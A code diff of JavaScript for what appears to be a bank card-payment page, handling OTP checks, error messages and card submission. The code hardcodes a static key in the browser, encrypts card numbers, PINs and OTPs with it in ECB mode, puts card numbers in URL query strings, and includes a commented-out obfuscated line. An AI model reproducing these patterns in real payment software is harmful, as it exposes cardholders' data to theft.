+                                document.paypage.kfastRegDeclineValue.value = "KFastRegDecline";
+                                document.paypage.action = "/kpg/kfastRegDecline.htm?paymentid=" + payid + "&kfastRegDeclineValue=" + document.paypage.kfastRegDeclineValue.value;
+                                document.paypage.submit();
+                            }
+                        }
+                        //Added for KFast Modification CR on 19/JAN/2023 - ends
+
+                        //Added for Security Fixes(Hidden Elements) - starts
+                        else if (otpStatus == "OTPDetailsUpdateFailureDecline") {
+                            document.paypage.cspg.value = formParameterValue(document.paypage, encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
+                            document.paypage.action = "/kpg/otpDetailsUpdateFailDecline.htm?paymentid=" + payid;
+                            document.paypage.submit();
+                        }
+                        //Added for Security Fixes(Hidden Elements) - ends
+                        //Added for Customer Validation
+                        else {
+                            var CVstatus = result[1];
+                            //document.paypage.CVretrycount.value = result[2];
+
+                            if (CVstatus == "CVFAIL") {
+                                document.paypage.cspg.value = formParameterValue(document.paypage, encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
+                                document.paypage.paymentCVdeclineValue.value = "CVdecline";
+                                document.paypage.action = "/kpg/paymentCVdecline.htm?paymentid=" + document.paypage.paymentId.value + "&paymentCVdeclineValue=" + document.paypage.paymentCVdeclineValue.value;
+                                document.paypage.submit();
+                            } else if (CVstatus == "CVTEX") {
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                document.getElementById('CVmsg').innerHTML = 'Customer Validation Server TimedOut,Please Try again later.!';
+                                $("#CVmsg").show();
+                                $("#otpmsgDC").hide();
+                                $("#ValidationMessage").hide();
+                            } else if (CVstatus == "CVUEX") {
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                document.getElementById('CVmsg').innerHTML = 'Unexcepted Error Occurred during Customer Validation,Please Try again later.!';
+                                $("#CVmsg").show();
+                                $("#otpmsgDC").hide();
+                                $("#ValidationMessage").hide();
+                            } else if (CVstatus == "CVSE") {
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                document.getElementById('CVmsg').innerHTML = 'Customer Validation Server error,Please Try again later.!';
+                                $("#CVmsg").show();
+                                $("#otpmsgDC").hide();
+                                $("#ValidationMessage").hide();
+                            } else if (CVstatus == "CVCARDNOTREG") {
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                document.getElementById('CVmsg').innerHTML = 'Customer Validation failed.Please contact your merchant/issuing bank';
+                                $("#CVmsg").show();
+                                $("#otpmsgDC").hide();
+                                $("#ValidationMessage").hide();
+                            } else {
+                                $("#overlayhide").hide();
+                                $('#proceed').show();
+                                document.getElementById('CVmsg').innerHTML = 'Unexcepted Error Occurred during Customer Validation,Please Try again later.!';
+                                $("#CVmsg").show();
+                                $("#otpmsgDC").hide();
+                                $("#ValidationMessage").hide();
+                            }
+                        }
+                    }
+                });
+            }
+
+        }
+
+
+        //Added for Points Redemption = modified 
+        //function payConfirmAjax(){
+        function payConfirmAjax(val) {
+
+            //Fix done by Sib - 25th April 2022
+
+            //var _0x2b16f7=_0x32c1;function _0x32c1(_0x3b466b,_0x5b19e4){var _0x4e163b=_0x4e16();return _0x32c1=function(_0x32c13b,_0xe3e9f3){_0x32c13b=_0x32c13b-0x1a9;var _0x300976=_0x4e163b[_0x32c13b];return _0x300976;},_0x32c1(_0x3b466b,_0x5b19e4);}function _0x4e16(){var _0x2a3fac=['12129176VhRRZn','3647WxGPJh','211083ypMQlC','value','pgEidiaDiscountFlag','paypage','511485PHrarS','523738nFdSNu','1578WbgLzG','1281560XMSMQq','1122456mTcZBZ'];_0x4e16=function(){return _0x2a3fac;};return _0x4e16();}(function(_0x4c3d35,_0x494c97){var _0x141f96=_0x32c1,_0x4d2845=_0x4c3d35();while(!![]){try{var _0x2d2e9f=-parseInt(_0x141f96(0x1a9))/0x1+-parseInt(_0x141f96(0x1aa))/0x2+-parseInt(_0x141f96(0x1b0))/0x3+-parseInt(_0x141f96(0x1ad))/0x4+-parseInt(_0x141f96(0x1ac))/0x5+parseInt(_0x141f96(0x1ab))/0x6*(parseInt(_0x141f96(0x1af))/0x7)+parseInt(_0x141f96(0x1ae))/0x8;if(_0x2d2e9f===_0x494c97)break;else _0x4d2845['push'](_0x4d2845['shift']());}catch(_0x5ed3fa){_0x4d2845['push'](_0x4d2845['shift']());}}}(_0x4e16,0x42891),document['paypage']['discountedtranamount'][_0x2b16f7(0x1b1)]='',document[_0x2b16f7(0x1b3)][_0x2b16f7(0x1b2)][_0x2b16f7(0x1b1)]=0x0);
+
+            //End of fix
+
+
+            $('#proceedConfirm').hide();
+            $("#overlayhide1").show();
+
+            //Added for Points Redemption
+            var langid = document.paypage.langID.value;
+            var otpGenMethod = document.paypage.otpgenMethod.value;
+            var otpvalidateValue = "";
+            if (otpGenMethod == "3") {
+                otpvalidateValue = val;
+            }
+            //Added for Points Redemption
+
+            /*Added for OTP at I-T-B level*/
+            document.paypage.OTPtranamtlmt.value = amountlimit;
+            document.paypage.OTPamtlmtidentifier.value = OTPamtlmtIdentifier;
+            /*Added for OTP at I-T-B level*/
+
+            //Added for Points Redemption - modified
+            //if(((document.paypage.timeOver.value==0)&&(document.paypage.debitOTP.value!="")&&(document.paypage.debitOTP.value.length==6))||document.paypage.otpflgdiv.value =="0" )
+            if (((document.paypage.timeOver.value == 0) && (document.paypage.debitOTP.value != "") && (document.paypage.debitOTP.value.length == document.paypage.debitOTP.maxLength)) || document.paypage.otpflgdiv.value == "0" || otpvalidateValue == "Resend" && document.paypage.timeOver.value == 0) {
+                if (document.paypage.otpflgdiv.value == "1") {
+
+                    var payid = document.paypage.paymentId.value;
+                    var otpcode = document.paypage.debitOTP.value;
+                    var paymentId = "43535900025480404358452000953040";
+                    var mode = 'ECB';
+                    var encryptedOtp = byteArrayToHex(rijndaelEncrypt(otpcode, hexToByteArray(paymentId), mode));
+                    var UserId = document.paypage.OtpUserID.value;
+
+                    //Added for prod issue - 29-jun-21
+                    var PaymentStatus = 'INITIALIZED';
+
+                    /* Added for Points Redemption - modified  */
+
+                    var url = "/kpg/paymentrouter.htm?paymentId=" + payid + "&instId=" + "202" + "&OtpValUserID=" + UserId + "&debitOTP=" + encryptedOtp + "&otpval=1" + "&Otptenant=" + document.paypage.Otptenant.value + "&creditDebitCheck=" + document.paypage.creditDebitCheck.value + "&otpvalcount=" + document.paypage.otpvalcount.value + "&otpGenMethod=" + otpGenMethod + "&OtpAction=" + otpvalidateValue + "&langID=" + langid + "&pymtPgEiddiscntflg=" + pymtPgEiddiscntflg + "&discountedtranamount=" + document.paypage.discountedtranamount.value + "&PaymentStatus=" + PaymentStatus;
+
+                    $.ajax({
+                        type: 'post',
+                        url: url,
+                        datatype: 'json',
+                        success: function(ajaxResponseData) {
+                            var xml = jQuery(ajaxResponseData);
+                            var res = xml.find("msg").text();
+                            var result = res.split("|");
+                            var response = result[0];
+                            var flag = result[1];
+                            document.paypage.otpvalcount.value = result[2];
+                            var ValidateOTPremainCnt = result[3];
+
+                            //Added for Points Redemption - modified
+                            if (result[4] == 1) {
+                                document.getElementById('Resend').style.display = "none";
+                            }
+                            //Added for Points Redemption - modified
+
+                            if (response == "200") {
+                                document.paypage.otpConfirmationFlg.value = 1;
+                                document.paypage.BranDType.value = brdtype;
+                                onProceed_buttonClicked();
+                            }
+
+                            //Added for Points Redemption
+                            else if (response == "OTPEXP") {
+                                document.getElementById('otpmsgDC2').innerHTML = 'OTP is Expired.<br />Only ' + ValidateOTPremainCnt + ' attempts allowed';
+                                $("#otpmsgDC2").show();
+                                //Added for Points Redemption - modified
+                                document.getElementById('otpmsgDC2').style.backgroundColor = '#f7dadd';
+                                document.getElementById('otpmsgDC2').style.border = '#ff0000 1px solid';
+                                document.getElementById('otpmsgDC2').style.color = '#ff0000';
+                                //Added for Points Redemption - modified
+                                $("#overlayhide1").hide();
+                                $('#proceedConfirm').show();
+                                document.paypage.debitOTP.value = "";
+                            } else if (response == "OTPINV") {
+                                document.getElementById('otpmsgDC2').innerHTML = 'Invalid OTP<br />Only ' + ValidateOTPremainCnt + ' attempts allowed';
+                                $("#otpmsgDC2").show();
+                                //Added for Points Redemption - modified
+                                document.getElementById('otpmsgDC2').style.backgroundColor = '#f7dadd';
+                                document.getElementById('otpmsgDC2').style.border = '#ff0000 1px solid';
+                                document.getElementById('otpmsgDC2').style.color = '#ff0000';
+                                //Added for Points Redemption - modified
+                                $("#overlayhide1").hide();
+                                $('#proceedConfirm').show();
+                                document.paypage.debitOTP.value = "";
+                            } else if (response == "OTPRESENT") {
+                                document.getElementById('otpmsgDC2').innerHTML = 'OTP has been resent successfully';
+                                $("#otpmsgDC2").show();
+                                //Added for QA fix
+                                resetTimer(otpTimer);
+                                //Added for Points Redemption - modified
+                                document.getElementById('otpmsgDC2').style.backgroundColor = ' #23d620';
+                                document.getElementById('otpmsgDC2').style.border = '#127d1b 1px solid';
+                                document.getElementById('otpmsgDC2').style.color = ' #127d1b';
+                                //Added for Points Redemption - modified
+                                $("#overlayhide1").hide();
+                                $('#proceedConfirm').show();
+                                document.paypage.debitOTP.value = "";
+                            }
+                            //Added for Points Redemption
+                            else if (response == "409") {
+                                $("#overlayhide1").hide();
+                                $('#proceedConfirm').show();
+                                document.getElementById('otpmsgDC2').innerHTML = 'There was a problem with your card information. Please contact your issuer bank.<br />Only ' + ValidateOTPremainCnt + ' attempts allowed';
+                                $("#otpmsgDC2").show();
+                                //Added for Points Redemption - modified
+                                document.getElementById('otpmsgDC2').style.backgroundColor = '#f7dadd';
+                                document.getElementById('otpmsgDC2').style.border = '#ff0000 1px solid';
+                                document.getElementById('otpmsgDC2').style.color = '#ff0000';
+                                //Added for Points Redemption - modified
+                                document.paypage.debitOTP.value = "";
+                            } else if (response == "404") {
+                                $("#overlayhide1").hide();
+                                $('#proceedConfirm').show();
+                                document.getElementById('otpmsgDC2').innerHTML = 'User doesn&#39;t exist. Please contact your issuer bank.<br />Only ' + ValidateOTPremainCnt + ' attempts allowed';
+                                $("#otpmsgDC2").show();
+                                //Added for Points Redemption - modified
+                                document.getElementById('otpmsgDC2').style.backgroundColor = '#f7dadd';
+                                document.getElementById('otpmsgDC2').style.border = '#ff0000 1px solid';
+                                document.getElementById('otpmsgDC2').style.color = '#ff0000';
+                                //Added for Points Redemption - modified
+                                document.paypage.debitOTP.value = "";
+                            }
+
+                            //Added by Viswajith S if OTP Configuration not done
+                            else if (response == "401") {
+                                $("#overlayhide1").hide();
+                                $('#proceedConfirm').show();
+                                //Added for Points Redemption - modified
+                                document.getElementById('otpmsgDC2').style.backgroundColor = '#f7dadd';
+                                document.getElementById('otpmsgDC2').style.border = '#ff0000 1px solid';
+                                document.getElementById('otpmsgDC2').style.color = '#ff0000';
+                                //Added for Points Redemption - modified
+                                document.getElementById('otpmsgDC2').innerHTML = 'Failed to validate the OTP please try again.<br />Only ' + ValidateOTPremainCnt + ' attempts allowed';
+                                $("#otpmsgDC2").show();
+                                document.paypage.debitOTP.value = "";
+                            }
+
+                            //Card number validation
+                            else if (response == "400") {
+                                $("#overlayhide1").hide();
+                                $('#proceedConfirm').show();
+                                document.getElementById('otpmsgDC2').innerHTML = 'Bad Request, the request is invalid or missing required information.<br />Only ' + ValidateOTPremainCnt + ' attempts allowed';
+                                $("#otpmsgDC2").show();
+                                //Added for Points Redemption - modified
+                                document.getElementById('otpmsgDC2').style.backgroundColor = '#f7dadd';
+                                document.getElementById('otpmsgDC2').style.border = '#ff0000 1px solid';
+                                document.getElementById('otpmsgDC2').style.color = '#ff0000';
+                                //Added for Points Redemption - modified
+                                document.paypage.debitOTP.value = "";
+                            } else if (response == "500") {
+                                $("#overlayhide1").hide();
+                                $('#proceedConfirm').show();
+                                document.getElementById('otpmsgDC2').innerHTML = 'An error occured while processing your request please try again.!<br />Only ' + ValidateOTPremainCnt + ' attempts allowed';
+                                $("#otpmsgDC2").show();
+                                //Added for Points Redemption - modified
+                                document.getElementById('otpmsgDC2').style.backgroundColor = '#f7dadd';
+                                document.getElementById('otpmsgDC2').style.border = '#ff0000 1px solid';
+                                document.getElementById('otpmsgDC2').style.color = '#ff0000';
+                                //Added for Points Redemption - modified
+                                $("#overlayhide1").fadeOut("slow");
+                                document.paypage.debitOTP.value = "";
+                            } else if (response == "UEX") {
+                                $("#overlayhide1").hide();
+                                $('#proceedConfirm').show();
+                                document.getElementById('otpmsgDC2').innerHTML = 'An Unexpected Error Occurred,Please Try again later.!<br />Only ' + ValidateOTPremainCnt + ' attempts allowed';
+                                $("#otpmsgDC2").show();
+                                //Added for Points Redemption - modified
+                                document.getElementById('otpmsgDC2').style.backgroundColor = '#f7dadd';
+                                document.getElementById('otpmsgDC2').style.border = '#ff0000 1px solid';
+                                document.getElementById('otpmsgDC2').style.color = '#ff0000';
+                                //Added for Points Redemption - modified
+                                document.paypage.debitOTP.value = "";
+                            } else if (response == "TEX") {
+                                $("#overlayhide1").hide();
+                                $('#proceedConfirm').show();
+                                document.getElementById('otpmsgDC2').innerHTML = 'OTP Server Timedout, Please Try again later.!<br />Only ' + ValidateOTPremainCnt + ' attempts allowed';
+                                $("#otpmsgDC2").show();
+                                //Added for Points Redemption - modified
+                                document.getElementById('otpmsgDC2').style.backgroundColor = '#f7dadd';
+                                document.getElementById('otpmsgDC2').style.border = '#ff0000 1px solid';
+                                document.getElementById('otpmsgDC2').style.color = '#ff0000';
+                                //Added for Points Redemption - modified
+                                document.paypage.debitOTP.value = "";
+                            } else if (response == "600") {
+                                document.paypage.cspg.value = formParameterValue(document.paypage, encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
+                                document.paypage.paymentOtpGenCancel.value = "OtpvalCancel";
+                                document.paypage.action = "/kpg/paymentOtpCancel.htm";
+                                document.paypage.submit();
+                            }
+
+                            //Added for Points Redemption
+                            else if (response == "OTPVALERROR") {
+                                document.paypage.cspg.value = formParameterValue(document.paypage, encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
+                                document.paypage.paymentOtpGenCancel.value = "OtpValError";
+                                document.paypage.action = "/kpg/paymentOtpCancel.htm";
+                                document.paypage.submit();
+                            }
+                            //Added for Points Redemption
+
+                            //Added for prod issue - 29-jun-21
+                            else if (response == "INVSTAT") {
+                                document.paypage.cspg.value = formParameterValue(document.paypage, encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
+                                document.paypage.ErrorText.value = 'Payment Page validation failed due to invalid Order Status:' + result[11];
+                                document.paypage.action = "/kpg/transactiondeclined.htm";
+                                document.paypage.submit();
+
+                            }
+                            //Added for prod issue - 29-jun-21
+                            else {
+                                $("#overlayhide1").hide();
+                                $('#proceedConfirm').show();
+                                document.getElementById('otpmsgDC2').innerHTML = 'An Unexpected Error Occurred,Please Try again later.!<br />Only ' + ValidateOTPremainCnt + ' attempts allowed';
+                                $("#otpmsgDC2").show();
+                                //Added for Points Redemption - modified
+                                document.getElementById('otpmsgDC2').style.backgroundColor = '#f7dadd';
+                                document.getElementById('otpmsgDC2').style.border = '#ff0000 1px solid';
+                                document.getElementById('otpmsgDC2').style.color = '#ff0000';
+                                //Added for Points Redemption - modified
+                                document.paypage.debitOTP.value = "";
+                            }
+                        }
+                    });
+
+                } else {
+                    onProceed_buttonClicked();
+                }
+            } else {
+
+                if (document.paypage.timeOver.value == 1) {
+                    $("#overlayhide1").hide();
+                    $('#proceedConfirm').show();
+                    $('#otpmsgDC2').show();
+                    //Added for Points Redemption - modified
+                    document.getElementById('otpmsgDC2').style.backgroundColor = '#f7dadd';
+                    document.getElementById('otpmsgDC2').style.border = '#ff0000 1px solid';
+                    document.getElementById('otpmsgDC2').style.color = '#ff0000';
+                    //Added for Points Redemption - modified
+                    document.getElementById('otpmsgDC2').innerHTML = "OTP has timed out.";
+                } else {
+                    $("#overlayhide1").hide();
+                    $('#proceedConfirm').show();
+                    $("#otpmsgDC2").show();
+                    //Added for Points Redemption - modified
+                    document.getElementById('otpmsgDC2').style.backgroundColor = '#f7dadd';
+                    document.getElementById('otpmsgDC2').style.border = '#ff0000 1px solid';
+                    document.getElementById('otpmsgDC2').style.color = '#ff0000';
+                    //Added for Points Redemption - modified
+                    document.getElementById('otpmsgDC2').innerHTML = "kindly Enter the " + document.paypage.debitOTP.maxLength + " digit OTP sent to your mobile";
+                }
+
+            }
+
+        }
+
+        function onProceed_buttonClicked() {
+            $('#proceedConfirm').hide();
+            $("#overlayhide1").show();
+
+            //Added for Points Redemption 
+            /* if(document.paypage.creditDebitCheck.value=="" )
+ 		{
+			   document.paypage.creditDebitCheck.value="D";
+ 		}  */
+
+            if (document.paypage.creditDebitCheck.value == "" && true) {
+                document.paypage.creditDebitCheck.value = "D";
+            } else if (document.paypage.creditDebitCheck.value == "" && false) {
+
+                document.paypage.creditDebitCheck.value = "C";
+
+            }
+            //Added for Points Redemption
+
+            //Added for prod issue - 29-jun-21
+            document.paypage.paymentStatus.value = 1;
+            //Added for prod issue - 29-jun-21
+
+            var creditDebitCheckVal = document.paypage.creditDebitCheck.value;
+
+            if (creditDebitCheckVal == "D") {
+                if (true) {
+                    var debitMonth = $("#debitMonthSelect").val();
+                    var debitYear = $("#debitYearSelect").val();
+                    $('#debitMonthSelect').remove();
+                    $('#debitYearSelect').remove();
+                } else {
+                    var debitMonth = $("#debitMonth").val();
+                    var debitYear = $("#debitYear").val();
+                }
+                var debitCardNumber = $("#debitCardNumber").val();
+                var cardPin = $("#cardPin").val();
+
+                var encryptedDbCdNumber = "";
+                var encryptedDebitMonth = "";
+                var encryptedDebitYear = "";
+                var encryptedCardPin = "";
+                var paymentId = "43535900025480404358452000953040";
+                var mode = 'ECB';
+                encryptedDbCdNumber = byteArrayToHex(rijndaelEncrypt(debitCardNumber, hexToByteArray(paymentId), mode));
+                if (cardPin != undefined) {
+                    encryptedCardPin = byteArrayToHex(rijndaelEncrypt(cardPin, hexToByteArray(paymentId), mode));
+                }
+                encryptedDebitMonth = byteArrayToHex(rijndaelEncrypt(debitMonth, hexToByteArray(paymentId), mode));
+                encryptedDebitYear = byteArrayToHex(rijndaelEncrypt(debitYear, hexToByteArray(paymentId), mode));
+
+
+                callDebitSave(document.paypage, encryptedDbCdNumber, encryptedDebitMonth, encryptedDebitYear, encryptedCardPin);
+
+            } else if (creditDebitCheckVal == "SVC") {
+                var encryptedCrCdNumber = "";
+                var encryptedSavedCardCardPin = "";
+
+
+                var cardCvv = "";
+                var cardPin = "";
+                var cardNumber = document.querySelector('input[name="savedCardNumber"]:checked').value.split(",")[0];
+                var cardType = document.querySelector('input[name="savedCardNumber"]:checked').value.split(",")[1];
+                var useinst = document.querySelector('input[name="savedCardNumber"]:checked').value.split(",")[2];
+                var authenticationtype = document.querySelector('input[name="savedCardNumber"]:checked').value.split(",")[3];
+                var savedbrandtype = document.querySelector('input[name="savedCardNumber"]:checked').value.split(",")[4];
+
+                if (savedbrandtype != null && savedbrandtype == 'MA') {
+                    cardCvv = '';
+                    cardPin = '';
+                } else {
+
+                    if (cardType == 'D') {
+
+                        cardCvv = $("#debitsavedcardCVV").val();
+                        cardPin = $("#debitsavedcardPIN").val();
+
+                    }
+
+                }
+
+                var paymentId = "43535900025480404358452000953040";
+                var mode = 'ECB';
+                encryptedCrCdNumber = byteArrayToHex(rijndaelEncrypt(cardNumber, hexToByteArray(paymentId), mode));
+
+
+                if (cardPin != undefined && cardPin != '') {
+                    encryptedSavedCardCardPin = byteArrayToHex(rijndaelEncrypt(cardPin, hexToByteArray(paymentId), mode));
+                }
+
+                document.paypage.usingFc.value = "on";
+                callSavedCardSave(document.paypage, encryptedCrCdNumber, encryptedSavedCardCardPin);
+
+            }
+
+            //Added for Points Redemption
+            else if (creditDebitCheckVal == "C") {
+                if (true) {
+                    var debitMonth = $("#debitMonthSelect").val();
+                    var debitYear = $("#debitYearSelect").val();
+                    $('#debitMonthSelect').remove();
+                    $('#debitYearSelect').remove();
+                } else {
+                    var debitMonth = $("#debitMonth").val();
+                    var debitYear = $("#debitYear").val();
+                }
+                var debitCardNumber = $("#debitCardNumber").val();
+
+                var encryptedDbCdNumber = "";
+                var encryptedDebitMonth = "";
+                var encryptedDebitYear = "";
+
+                var paymentId = "43535900025480404358452000953040";
+                var mode = 'ECB';
+                encryptedDbCdNumber = byteArrayToHex(rijndaelEncrypt(debitCardNumber, hexToByteArray(paymentId), mode));
+
+                encryptedDebitMonth = byteArrayToHex(rijndaelEncrypt(debitMonth, hexToByteArray(paymentId), mode));
+                encryptedDebitYear = byteArrayToHex(rijndaelEncrypt(debitYear, hexToByteArray(paymentId), mode));
+
+
+                callCreditSave(document.paypage, encryptedDbCdNumber, encryptedDebitMonth, encryptedDebitYear);
+
+            }
+            //Added for Points Redemption
+
+        }
+
+
+        function onReset_buttonClicked() {
+            var checkFC;
+            var checkDC;
+            if (document.getElementById("savedCardDiv").style.display == 'block') {
+                checkFC = document.getElementById("paymentOptionFC").checked;
+            }
+            if (document.getElementById("FCUseDebitEnable").style.display == 'block') {
+                checkDC = document.getElementById("paymentOptionDC").checked;
+            }
+
+            document.getElementById("paypage").reset();
+
+            if (checkFC) {
+                document.getElementById("paymentOptionFC").checked = true;
+            }
+            if (checkDC) {
+                document.getElementById("paymentOptionDC").checked = true;
+            }
+            document.getElementById('dcprefix').innerHTML = '<select  class="paymentselect"><option>Prefix</option></select>';
+
+            //Added for cosmetic changes
+            if (document.getElementById("ValidationMessage")) {
+                $("#ValidationMessage").hide();
+            }
+            if (document.getElementById("CVmsg")) {
+                $("#CVmsg").hide();
+            }
+            if (document.getElementById("otpmsgDC")) {
+                $("#otpmsgDC").hide();
+            }
+            if (document.getElementById("otpmsgDC2")) {
+                $("#otpmsgDC2").hide();
+            }
+            //Added for cosmetic changes
+
+        }
+        /**Added for One Click Checkout**/
+        //SavedCard
+
+
+        function callSavedCardSave(formObject, encryptedCrCdNumber, encryptedCreditCardPin) {
+
+            document.paypage.proceed.disabled = true;
+            //document.paypage.cancel.disabled = true;
+
+            if (document.getElementById("debitNumber")) {
+                document.getElementById("debitNumber").value = "";
+            }
+
+            if (document.getElementById("dcprefix")) {
+                document.getElementById("dcprefix").value = "";
+            }
+
+            if (document.getElementById("debitsavedcardPIN")) {
+                document.getElementById("debitsavedcardPIN").value = "";
+            }
+
+            document.paypage.encryptedCardNumber.value = encryptedCrCdNumber;
+            document.paypage.encryptedSavedCardPin.value = encryptedCreditCardPin;
+            document.paypage.cspg.value = formParameterValue(document.paypage, encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
+            document.paypage.action = "/kpg/paymentrouter.htm";
+            document.paypage.submit();
+
+
+        }
+        /**Added for One Click Checkout**/
+
+
+        //Debit
+        function callDebitSave(formObject, encryptedDbCdNumber, encryptedDebitMonth, encryptedDebitYear, encryptedCardPin) {
+
+
+            document.paypage.confirm.disabled = true;
+            //document.paypage.cancel.disabled = true;
+            //document.paypage.reset.disabled = true;
+
+            /* var fcListDebitCnt = 0;
+   			
+   			
+   			if(fcListDebitCnt == 0) {
+   			
+   			document.paypage.debitCardNumber.value="****************";
+   		   	 document.paypage.encryptedCardNumber.value=encryptedDbCdNumber;
+   				document.paypage.fcExpCheck.value = "";
+   			} */
+
+            document.paypage.debitCardNumber.value = "****************";
+            document.paypage.encryptedCardNumber.value = encryptedDbCdNumber;
+
+            if (document.getElementById("debitNumber")) {
+                document.getElementById("debitNumber").value = "";
+            }
+
+            if (document.getElementById("dcprefix")) {
+                document.getElementById("dcprefix").value = "";
+            }
+
+            if (document.getElementById("debitsavedcardPIN")) {
+                document.getElementById("debitsavedcardPIN").value = "";
+            }
+
+            if (false) {
+                document.paypage.debitMonth.value = "**";
+                document.paypage.debitYear.value = "****";
+            }
+            document.paypage.encryptedMonth.value = encryptedDebitMonth;
+
+
+            document.paypage.encryptedYear.value = encryptedDebitYear;
+
+            if (encryptedCardPin != '') {
+                document.paypage.cardPin.value = encryptedCardPin;
+            }
+
+
+            document.paypage.cspg.value = formParameterValue(document.paypage, encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
+            document.paypage.action = "/kpg/paymentrouter.htm";
+            document.paypage.submit();
+
+
+        }
+
+        //Added for Points Redemption 
+        function callCreditSave(formObject, encryptedDbCdNumber, encryptedDebitMonth, encryptedDebitYear) {
+
+
+            document.paypage.confirm.disabled = true;
+            /* document.paypage.cancel.disabled = true;
+            document.paypage.reset.disabled = true; */
+
+
+            document.paypage.debitCardNumber.value = "****************";
+            document.paypage.encryptedCardNumber.value = encryptedDbCdNumber;
+
+            if (document.getElementById("debitNumber")) {
+                document.getElementById("debitNumber").value = "";
+            }
+
+            if (document.getElementById("dcprefix")) {
+                document.getElementById("dcprefix").value = "";
+            }
+
+            if (document.getElementById("debitsavedcardPIN")) {
+                document.getElementById("debitsavedcardPIN").value = "";
+            }
+
+            if (false) {
+                document.paypage.debitMonth.value = "**";
+                document.paypage.debitYear.value = "****";
+            }
+            document.paypage.encryptedMonth.value = encryptedDebitMonth;
+
+
+            document.paypage.encryptedYear.value = encryptedDebitYear;
+
+            document.paypage.cspg.value = formParameterValue(document.paypage, encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
+            document.paypage.action = "/kpg/paymentrouter.htm";
+            document.paypage.submit();
+
+        }
+        //Added for Points Redemption
+    </script>
+
+
+    <script type="text/javascript">
+        if (window.history.forward(1) != null) {
+            window.history.forward(1);
+        }
+
+        //	var cardNoTemp = "";
+        function initRequest() {
+            if (window.ActiveXObject) {
+                req = new ActiveXObject("Microsoft.XMLHTTP");
+            } else if (window.XMLHttpRequest) {
+                req = new XMLHttpRequest();
+            }
+            return req;
+        }
+
+        function performMaestroRupayCheck(cardNo) {
+            if (false) {
+                document.paypage.selectedPymntInstrmnt.value = document.paypage.creditDebitCheck.value;
+            }
+
+            if (cardNo == "")
+                return false;
+
+            /* if (cardNoTemp == cardNo)
+            	return false; */
+            var payID = document.paypage.paymentId.value;
+            //	cardNoTemp = cardNo; 
+
+            var url = "/kpg/checkMaestroBrand.htm?paymentId=" + payID + "&termId=" + 506201 + "&instId=" + 202 + "&merchId=" + 5062 + "&cardNo=" + cardNo;
+            var req = initRequest();
+            req.open("POST", url, false);
+            req.send(null);
+            if (req.status == 200) {
+                var onOffFlg = 0;
+                var msg = req.responseXML.getElementsByTagName("msg")[0];
+                if (msg != null) {
+                    if ("undefined" != msg.getElementsByTagName("brandType")) {
+                        var BrandType = msg.getElementsByTagName("brandType")[0].childNodes[0].nodeValue;
+                        document.paypage.checkBrand.value = BrandType;
+                        if ("undefined" != msg.getElementsByTagName("onOffFlg")) {
+                            onOffFlg = msg.getElementsByTagName("onOffFlg")[0].childNodes[0].nodeValue;
+                            document.paypage.onOffType.value = onOffFlg;
+                        }
+                        if (BrandType == "MA") {
+                            if (document.paypage.selectedPymntInstrmnt.value == 'C') {
+                                if (document.getElementById("cardCVVHideShow"))
+                                    document.getElementById("cardCVVHideShow").style.display = 'none';
+                                if (document.getElementById("cardCVVHideShow1"))
+                                    document.getElementById("cardCVVHideShow1").style.display = 'none';
+                                if (document.getElementById("cardCVVD2HideShow"))
+                                    document.getElementById("cardCVVD2HideShow").style.display = 'none';
+                                alert("You have entered a Maestro Card. So the transaction will be processed without CVV..\n If your Maestro card does not have expiry date then request you to select Month as 12 and Year as 2049");
+                                document.getElementById("maestro").value = "MA";
+                            } else if (document.paypage.selectedPymntInstrmnt.value == 'OC') {
+                                if (document.getElementById("otherCardCVVHideShow"))
+                                    document.getElementById("otherCardCVVHideShow").style.display = 'none';
+                                if (document.getElementById("otherCardCVVHideShow1"))
+                                    document.getElementById("otherCardCVVHideShow1").style.display = 'none';
+                                if (document.getElementById("otherCreditcardCVVD2HideShow"))
+                                    document.getElementById("otherCreditcardCVVD2HideShow").style.display = 'none';
+                                alert("You have entered a Maestro Card. So the transaction will be processed without CVV..\n If your Maestro card does not have expiry date then request you to select Month as 12 and Year as 2049");
+                                document.getElementById("maestro").value = "MA";
+                            } else if (document.paypage.selectedPymntInstrmnt.value == 'D') {
+                                if (document.getElementById("debitCardCVVHideShow"))
+                                    document.getElementById("debitCardCVVHideShow").style.display = 'none';
+                                if (document.getElementById("cardCVD2HideShowPIN"))
+                                    document.getElementById("cardCVD2HideShowPIN").style.display = 'none';
+                                alert("You have entered a Maestro Card. So the transaction will be processed without CVV..\n If your Maestro card does not have expiry date then request you to select Month as 12 and Year as 2049");
+                                document.getElementById("maestro").value = "MA";
+                            } else if (document.paypage.selectedPymntInstrmnt.value == 'OD') {
+                                if (document.getElementById("otherDebitCardCVVHideShow"))
+                                    document.getElementById("otherDebitCardCVVHideShow").style.display = 'none';
+                                if (document.getElementById("otherDebitCardCVD2HideShowPIN"))
+                                    document.getElementById("otherDebitCardCVD2HideShowPIN").style.display = 'none';
+                                alert("You have entered a Maestro Card. So the transaction will be processed without CVV..\n If your Maestro card does not have expiry date then request you to select Month as 12 and Year as 2049");
+                                document.getElementById("maestro").value = "MA";
+                            }
+
+
+                            document.getElementById("rdc").value = "";
+
+                        } else if (BrandType == "RDC" && false) {
+
+                            //document.paypage.fcFlag.value=0;
+                            document.paypage.siFlag.value = 0;
+
+                            $("#siflg").hide();
+                            /* $("#checkprepaidFC").hide();
+                            $("#checkFC").hide();
+                            $("#checkDebitFC").hide();
+                            $("#fcDetails").hide(); */
+                            if (document.paypage.selectedPymntInstrmnt.value == 'D') {
+                                if (document.paypage.debitSel.value == 'VP' || document.paypage.debitSel.value == 'V') {
+                                    if (document.getElementById("cardCVD2HideShowPIN"))
+                                        document.getElementById("cardCVD2HideShowPIN").style.display = 'block';
+                                    if (document.getElementById("debitCardCVVHideShow"))
+                                        document.getElementById("debitCardCVVHideShow").style.display = 'none';
+                                    if (document.getElementById("savedCardCVVHideShow"))
+                                        document.getElementById("savedCardCVVHideShow").style.display = 'none';
+                                }
